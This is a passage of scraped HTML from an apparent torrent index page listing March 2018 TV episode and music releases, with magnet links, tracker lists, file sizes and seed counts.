<a class="imagnet icon16" href="magnet:?xt=urn:btih:D98812B111196FE0DC2133E141AD214588626CCF&dn=Counterpart S01E09 WEB H264-DEFLATE EZTV&xl=224246302&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://tracker.files.fm:6969/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/counterpart-s01e09-web-h264-deflate-eztv-t271078/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 06:13:26">6 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>213.86 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>943</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>123</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/timeless-s02e02-hdtv-x264-killers-eztv-t271982.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/timeless-s02e02-hdtv-x264-killers-eztv-t271982.html" "><b>Timeless S02E02 HDTV x264-KILLERS EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/timeless-s02e02-hdtv-x264-killers-eztv-t271982.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:41A9ECA56F8AF0C266CF7D4AEF3B8385007206A4&dn=Timeless S02E02 HDTV x264-KILLERS EZTV&xl=263813807&tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://mgtracker.org:2710/announce&tr=udp://mgtracker.org:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://asnet.pw:2710/announce&tr=udp://p4p.arenabg.ch:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/timeless-s02e02-hdtv-x264-killers-eztv-t271982/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 09:35:02">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>251.59 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 239</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>849</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/greys-anatomy-s14e16-hdtv-x264-killers-eztv-t274676.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/greys-anatomy-s14e16-hdtv-x264-killers-eztv-t274676.html" "><b>Greys Anatomy S14E16 HDTV x264-KILLERS EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/greys-anatomy-s14e16-hdtv-x264-killers-eztv-t274676.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:A71A4099B7A7D821A71291078D8816B119407E79&dn=Greys Anatomy S14E16 HDTV x264-KILLERS EZTV&xl=301499514&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr= http://tracker.uw0.xyz:6969/announce &tr=udp://p4p.arenabg.com:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/greys-anatomy-s14e16-hdtv-x264-killers-eztv-t274676/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 00:14:00">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>287.53 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>3 257</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>507</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/black-lightning-s01e09-hdtv-x264-sva-ettv-t273830.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/black-lightning-s01e09-hdtv-x264-sva-ettv-t273830.html" "><b>Black.Lightning.S01E09.HDTV.x264-SVA[ettv]</b></a> <small><i>by <a href='/perfil/ettv/'>ettv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/black-lightning-s01e09-hdtv-x264-sva-ettv-t273830.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:B63CE26610731641141BF562FBDBC876CDB0B536&dn=Black.Lightning.S01E09.HDTV.x264-SVA[ettv]&xl=260307977&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr= udp://tracker.pirateparty.gr:6969/announce &tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://tracker.skyts.cn:6969/announce &tr= http://182.190.3.68:6969/announce &tr=http://tracker1.itzmx.com:8080/announce&tr= http://tracker.uw0.xyz:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/black-lightning-s01e09-hdtv-x264-sva-ettv-t273830/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="21/03/2018 07:32:29">3 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>248.25 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 524</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>763</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/krypton-s01e01-hdtv-x264-sva-ettv-t274312.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/krypton-s01e01-hdtv-x264-sva-ettv-t274312.html" "><b>Krypton.S01E01.HDTV.x264-SVA[ettv]</b></a> <small><i>by <a href='/perfil/ettv/'>ettv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/krypton-s01e01-hdtv-x264-sva-ettv-t274312.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:8EFC83DA8B93D3FDE3141E10D6354247D30C4FAE&dn=Krypton.S01E01.HDTV.x264-SVA[ettv]&xl=241358112&tr= udp://tracker.pirateparty.gr:6969/announce &tr=udp://tracker.coppersurfer.tk:6969&tr=udp://shadowshq.yi.org:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://tracker.opentrackr.org:1337&tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr=udp://9.rarbg.to:2710&tr=udp://inferno.demonoid.pw:3391/announce&tr=udp://p4p.arenabg.com:1337&tr=udp://open.stealth.si:80&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr= http://bt.xxx-tracker.com:2710/announce &tr=http://tracker1.itzmx.com:8080/announce&tr= http://tracker.skyts.cn:6969/announce &tr= http://182.190.3.68:6969/announce &tr= http://tracker.uw0.xyz:6969/announce &tr=udp://p4p.arenabg.ch:1337&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/krypton-s01e01-hdtv-x264-sva-ettv-t274312/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="22/03/2018 04:31:31">2 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>230.18 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 547</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>318</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/deception-2018-s01e02-hdtv-x264-killers-eztv-t271797.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/deception-2018-s01e02-hdtv-x264-killers-eztv-t271797.html" "><b>Deception 2018 S01E02 HDTV x264-KILLERS EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/deception-2018-s01e02-hdtv-x264-killers-eztv-t271797.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:C669BDB01F85A40D3AFF04E09B3281B7D6AF6D12&dn=Deception 2018 S01E02 HDTV x264-KILLERS EZTV&xl=347199795&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://open.acgtracker.com:1096/announce&tr=udp://asnet.pw:2710/announce&tr=udp://p4p.arenabg.ch:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/deception-2018-s01e02-hdtv-x264-killers-eztv-t271797/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 02:59:22">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>331.12 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 184</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>949</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/scorpion-s04e19-hdtv-x264-lol-eztv-t272781.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/scorpion-s04e19-hdtv-x264-lol-eztv-t272781.html" "><b>Scorpion S04E19 HDTV x264-LOL EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/scorpion-s04e19-hdtv-x264-lol-eztv-t272781.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:FB04224418F061E023D47D8EC6F68A95CB8C0BDA&dn=Scorpion S04E19 HDTV x264-LOL EZTV&xl=439494833&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://tracker.files.fm:6969/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/scorpion-s04e19-hdtv-x264-lol-eztv-t272781/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 10:41:40">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>419.13 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 660</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>217</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/krypton-s01e01-hdtv-x264-sva-eztv-t274679.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/krypton-s01e01-hdtv-x264-sva-eztv-t274679.html" "><b>Krypton S01E01 HDTV x264-SVA EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/krypton-s01e01-hdtv-x264-sva-eztv-t274679.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:9921E516C6199B4FCFDFD090032CDDBCCF79E127&dn=Krypton S01E01 HDTV x264-SVA EZTV&xl=241357919&tr= udp://tracker.pirateparty.gr:6969/announce &tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://9.rarbg.to:2710&tr=udp://p4p.arenabg.com:1337&tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr= http://tracker.uw0.xyz:6969/announce &tr=udp://p4p.arenabg.ch:1337&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/krypton-s01e01-hdtv-x264-sva-eztv-t274679/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 00:14:09">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>230.18 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 311</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>290</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/instinct-us-s01e01-hdtv-x264-lol-eztv-t271973.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/instinct-us-s01e01-hdtv-x264-lol-eztv-t271973.html" "><b>Instinct US S01E01 HDTV x264-LOL EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/instinct-us-s01e01-hdtv-x264-lol-eztv-t271973.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:ACAC790980841F38E15A18A427901EEB1CC23FAA&dn=Instinct US S01E01 HDTV x264-LOL EZTV&xl=263334829&tr=udp://eddie4.nl:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://tracker.files.fm:6969/announce&tr=udp://p4p.arenabg.ch:1337&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/instinct-us-s01e01-hdtv-x264-lol-eztv-t271973/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 09:30:13">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>251.14 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>871</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>689</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/station-19-s01e01-hdtv-x264-killers-eztv-t274986.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/station-19-s01e01-hdtv-x264-killers-eztv-t274986.html" "><b>Station 19 S01E01 HDTV x264-KILLERS EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/station-19-s01e01-hdtv-x264-killers-eztv-t274986.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:4086D086CFD1BA0051A1AFC005C66CBB82549473&dn=Station 19 S01E01 HDTV x264-KILLERS EZTV&xl=322915621&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://tracker.uw0.xyz:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/station-19-s01e01-hdtv-x264-killers-eztv-t274986/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 13:13:44">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>307.96 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 273</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>193</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/modern-family-s09e16-hdtv-x264-sva-ettv-t274144.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/modern-family-s09e16-hdtv-x264-sva-ettv-t274144.html" "><b>Modern.Family.S09E16.HDTV.x264-SVA[ettv]</b></a> <small><i>by <a href='/perfil/ettv/'>ettv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/modern-family-s09e16-hdtv-x264-sva-ettv-t274144.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:7AD323200891F0E85788766FACE1DBC41159CB47&dn=Modern.Family.S09E16.HDTV.x264-SVA[ettv]&xl=171525324&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://eddie4.nl:6969&tr=udp://shadowshq.yi.org:6969&tr=udp://9.rarbg.to:2710&tr=udp://inferno.demonoid.pw:3391/announce&tr=udp://p4p.arenabg.com:1337&tr= udp://tracker.pirateparty.gr:6969/announce &tr=udp://open.stealth.si:80&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr= http://bt.xxx-tracker.com:2710/announce &tr=http://tracker1.itzmx.com:8080/announce&tr=udp://p4p.arenabg.ch:1337&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/modern-family-s09e16-hdtv-x264-sva-ettv-t274144/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="22/03/2018 00:31:03">2 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>163.58 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 075</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>276</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/gotham-s04e15-hdtv-x264-sva-ettv-t274753.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/gotham-s04e15-hdtv-x264-sva-ettv-t274753.html" "><b>Gotham.S04E15.HDTV.x264-SVA[ettv]</b></a> <small><i>by <a href='/perfil/ettv/'>ettv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/gotham-s04e15-hdtv-x264-sva-ettv-t274753.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:96EB9322037E3D4D05484A1FC106CDA88943B51B&dn=Gotham.S04E15.HDTV.x264-SVA[ettv]&xl=315858511&tr= udp://tracker.pirateparty.gr:6969/announce &tr=udp://tracker.leechers-paradise.org:6969&tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.coppersurfer.tk:6969&tr= http://bt.xxx-tracker.com:2710/announce &tr= http://tracker.uw0.xyz:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/gotham-s04e15-hdtv-x264-sva-ettv-t274753/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 06:33:32">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>301.23 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>729</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>86</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/lucifer-s03e18-hdtv-x264-killers-ettv-t271883.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/lucifer-s03e18-hdtv-x264-killers-ettv-t271883.html" "><b>Lucifer.S03E18.HDTV.x264-KILLERS[ettv]</b></a> <small><i>by <a href='/perfil/ettv/'>ettv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/lucifer-s03e18-hdtv-x264-killers-ettv-t271883.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:73BF9F4F4D12F6A6980DF0F2A5900D4C02185F0F&dn=Lucifer.S03E18.HDTV.x264-KILLERS[ettv]&xl=268934091&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://tracker1.itzmx.com:8080/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/lucifer-s03e18-hdtv-x264-killers-ettv-t271883/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 05:30:36">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>256.48 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 400</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>282</font></b></td>
</tr>
</table>
</td></tr></table><br /><br /><br /><table class="main" width=100% border=0 cellspacing=0 cellpadding=0><tr><td class="embedded"><h2><a href="/top/musicas/">MUSICS</a></h2>
<table class="torrenttable" width="100%">
<tr style="background-color: transparent;">
<td class="colhead" align="left">TORRENT</td>
<td class="colhead" align="left">&nbsp;</td>
<td class="colhead" align="center">UPLOADED</td><td class="colhead" align="center">SIZE</td><td class="colhead" align="right">SEEDS</td>
<td class="colhead" align="right">LEECHS</td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat500 icon16" href="/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180.html" "><b>Various Artists - New Releases of the 12th Week of 2018 [Mp3 320Kbps Songs]</b></a> <small><i>by <a href='/perfil/pmedia/'>pmedia</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a id="275180" class="jTip icomment icon16" name="Comentários:" href="/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180/comentarios" onclick="window.location='/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180.html?tab=comentarios'">
<em class="iconvalue">1</em>
<span></span>
</a>
</span>
<a class="iverified icon16" href="/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:D667DF3CFD9EEDBF0BF1B625B99622B8D4BF973E&dn=Various Artists - New Releases of the 12th Week of 2018 [Mp3 320Kbps Songs]&xl=675467894&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/various-artists-new-releases-of-the-12th-week-of-2018-mp3-320kbps-songs-t275180/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 21:14:24">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>644.18 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>83</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>32</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat500 icon16" href="/2018-hans-zimmer-discography-mp3-320kbs-t274636.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/2018-hans-zimmer-discography-mp3-320kbs-t274636.html" "><b>2018 - Hans Zimmer Discography (MP3 - 320kbs)</b></a> <small><i>by <a href='/perfil/maxmon/'>maxmon</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/2018-hans-zimmer-discography-mp3-320kbs-t274636.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:439590C9967CCE73AAB995608741773C880DDD5F&dn=2018 - Hans Zimmer Discography (MP3 - 320kbs)&xl=9723109961&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/2018-hans-zimmer-discography-mp3-320kbs-t274636/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="22/03/2018 13:17:20">2 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>9.06 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>20</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>26</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat500 icon16" href="/fm-atomic-generation-2018-t271245.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/fm-atomic-generation-2018-t271245.html" "><b>FM - Atomic Generation 2018</b></a> <small><i>by <a href='/perfil/analogkid6103/'>analogkid6103</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/fm-atomic-generation-2018-t271245.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:E7ACDCA084C71CF273E6F2450D1B2229C6E01869&dn=FM - Atomic Generation 2018&xl=129938860&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://9.rarbg.to:2710&tr=udp://tracker.opentrackr.org:1337&tr=http://tracker.files.fm:6969/announce&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/fm-atomic-generation-2018-t271245/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 08:06:07">6 days</span></td>
